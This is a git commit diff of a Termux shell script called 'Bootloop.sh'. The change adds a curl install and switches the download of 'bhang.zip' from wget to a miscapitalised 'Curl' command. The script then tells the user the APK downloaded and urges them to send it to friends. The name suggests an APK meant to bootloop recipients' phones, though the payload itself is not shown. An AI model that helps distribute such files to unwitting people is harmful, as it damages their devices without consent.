50eb2572ccb51dbd873c681d28de4e4ae8dd929d
princeyasinzone <38537313+princeyasinzone@users.noreply.github.com>
2018-05-11 23:58:48 +0530

    Update Bootloop.sh

--- Bootloop.sh
+++ Bootloop.sh
@@ -2,6 +2,7 @@ gem install lolcat
 pkg install figlet
 pkg install wget
 pkg install toilet
+pkg install curl
 clear
 echo
 figlet Prince Yasin |lolcat
@@ -10,7 +11,7 @@ echo
 echo -e "\033[1m \e[32m ( Made by Prince Yasin and Arif-Tech )"
 echo
 echo
-wget https://github.com/princeyasinzone/Magic/blob/master/bhang.zip
+Curl -LO https://github.com/princeyasinzone/Magic/blob/master/bhang.zip
 echo
 echo "$(tput setaf 3)Apk Download succsesfuly...send to ur ...Frends...
 ........pls LIKE SUBSCRIBE...Thanks...4r...watching.$(tput sgr 0)" | pv -qL 10 ;
